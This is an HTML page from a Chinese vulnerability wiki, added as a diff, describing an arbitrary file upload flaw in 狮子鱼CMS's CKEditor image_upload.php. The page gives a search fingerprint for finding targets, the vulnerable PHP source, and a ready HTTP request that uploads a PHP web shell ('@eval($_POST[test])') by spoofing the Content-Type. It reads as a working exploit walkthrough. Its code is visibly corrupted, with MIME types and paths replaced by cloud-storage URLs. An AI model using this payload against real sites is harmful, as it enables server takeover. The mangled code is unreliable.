@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CMS%E6%BC%8F%E6%B4%9E/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20image_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>狮子鱼CMS image_upload.php 任意文件上传 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u72ee\u5b50\u9c7cCMS image_upload.php \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20wxapp.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20wxapp.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        狮子鱼CMS wxapp.php 任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20ApigoodController.class.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20ApigoodController.class.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        狮子鱼CMS ApigoodController.class.php SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="cms-image_uploadphp">狮子鱼CMS image_upload.php 任意文件上传<a class="headerlink" href="#cms-image_uploadphp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>狮子鱼CMS使用CK编辑器，存在图片上传的绕过，造成 image_upload.php 任意文件上传</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>狮子鱼CMS
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>&quot;/seller.php?s=/Public/login&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面如下</p>
+<p><img alt="" src="../images/202202170928345.png" /></p>
+<p>漏洞文件为 CK编辑器的 image_upload.php</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+ <span class="nb">define</span> <span class="p">(</span> <span class="s1">&#39;IN_BAMBOO&#39;</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
+ <span class="c1">// 取得根目录</span>
+<span class="nb">define</span> <span class="p">(</span> <span class="s1">&#39;ROOT_PATH&#39;</span><span class="p">,</span> <span class="s1">&#39;../../../../&#39;</span> <span class="p">);</span>  <span class="c1">// back to your root path</span>
+
+<span class="nv">$arrType</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span>
+        <span class="s1">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpg&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/png&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/bmp&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/pjpeg&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpeg&#39;</span> 
+<span class="p">);</span>
+<span class="nv">$max_size</span> <span class="o">=</span> <span class="mi">500</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span> <span class="c1">// 最大文件限制（单位：byte）</span>
+<span class="nv">$upfile</span> <span class="o">=</span> <span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads&#39;</span><span class="p">;</span> <span class="c1">// 图片目录路径</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span> <span class="p">[</span><span class="s1">&#39;files&#39;</span><span class="p">])){</span>
+    <span class="k">echo</span> <span class="s1">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;未能找到图片，请确认图片是否过大&quot;}&#39;</span><span class="p">;</span>
+    <span class="k">exit</span> <span class="p">();</span>
+<span class="p">}</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span> <span class="p">[</span><span class="s1">&#39;files&#39;</span><span class="p">];</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span> <span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 判断提交方式是否为POST</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">is_uploaded_file</span> <span class="p">(</span> <span class="nv">$file</span> <span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span> <span class="c1">// 判断上传文件是否存在</span>
+        <span class="k">echo</span> <span class="s1">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;图片不存在&quot;}&#39;</span><span class="p">;</span>
+        <span class="k">exit</span> <span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nv">$max_size</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 判断文件大小是否大于500000字节</span>
+        <span class="k">echo</span> <span class="s1">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;上传图片太大，最大支持：&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$max_size</span><span class="o">/</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;KB&quot;}&#39;</span><span class="p">;</span>
+        <span class="k">exit</span> <span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">in_array</span> <span class="p">(</span> <span class="nv">$file</span> <span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="nv">$arrType</span> <span class="p">))</span> <span class="p">{</span> <span class="c1">// 判断图片文件的格式</span>
+        <span class="k">echo</span> <span class="s1">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;上传图片格式不对&quot;}&#39;</span><span class="p">;</span>
+        <span class="k">exit</span> <span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">file_exists</span> <span class="p">(</span> <span class="nv">$upfile</span> <span class="p">))</span> <span class="p">{</span> <span class="c1">// 判断存放文件目录是否存在</span>
+        <span class="nb">mkdir</span> <span class="p">(</span> <span class="nv">$upfile</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$imageSize</span> <span class="o">=</span> <span class="nb">getimagesize</span> <span class="p">(</span> <span class="nv">$file</span> <span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span> <span class="p">);</span>
+    <span class="nv">$img</span> <span class="o">=</span> <span class="nv">$imageSize</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;*&#39;</span> <span class="o">.</span> <span class="nv">$imageSize</span> <span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="nv">$fname</span> <span class="o">=</span> <span class="nv">$file</span> <span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+    <span class="nv">$ftype</span> <span class="o">=</span> <span class="nb">explode</span> <span class="p">(</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$fname</span> <span class="p">);</span>
+    <span class="nv">$time</span> <span class="o">=</span> <span class="nb">explode</span> <span class="p">(</span> <span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nb">microtime</span> <span class="p">()</span> <span class="p">);</span>
+    <span class="nv">$time</span> <span class="o">=</span> <span class="nv">$time</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$time</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>
+    <span class="nv">$time2</span> <span class="o">=</span> <span class="nb">explode</span> <span class="p">(</span> <span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="nv">$time</span> <span class="p">);</span>  
+    <span class="nv">$time</span> <span class="o">=</span> <span class="nv">$time2</span> <span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="nv">$returnName</span><span class="o">=</span><span class="nv">$time</span><span class="o">.</span><span class="s2">&quot;.&quot;</span> <span class="o">.</span><span class="nb">end</span><span class="p">(</span><span class="nv">$ftype</span><span class="p">);</span>
+    <span class="nv">$picName</span> <span class="o">=</span> <span class="nv">$upfile</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="nv">$returnName</span> <span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">move_uploaded_file</span> <span class="p">(</span> <span class="nv">$file</span> <span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$picName</span> <span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;从:&#39;</span><span class="o">.</span><span class="nv">$file</span> <span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;移动图片到:&#39;</span><span class="o">.</span><span class="nv">$picName</span><span class="o">.</span><span class="s1">&#39;出错&quot;}&#39;</span><span class="p">;</span>
+        <span class="k">exit</span> <span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">&#39;{&quot;result&quot;:&quot;200&quot;,&quot;imgurl&quot;:&quot;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/&#39;</span> <span class="o">.</span> <span class="nv">$returnName</span> <span class="o">.</span> <span class="s1">&#39;&quot;}&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<p>其中使用 <strong>Content-Type:</strong> <a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif"><strong>http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif</strong></a>  即可绕过上传PHP文件</p>
+<div class="highlight"><pre><span></span><code>POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
+Host: 
+Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+Content-Length: 208
+
+------WebKitFormBoundary8UaANmWAgM4BqBSs
+Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;test.php&quot;
+Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
+
+&lt;?php @eval($_POST[test]);?&gt;
+------WebKitFormBoundary8UaANmWAgM4BqBSs—
+</code></pre></div>
+<p><img alt="" src="../images/202202170928692.png" /></p>
+<p>访问返回的文件路径</p>
+<div class="highlight"><pre><span></span><code>/Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php
+</code></pre></div>
+<p><img alt="" src="../images/202202170928744.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20wxapp.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20wxapp.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        狮子鱼CMS wxapp.php 任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20ApigoodController.class.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20ApigoodController.class.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        狮子鱼CMS ApigoodController.class.php SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
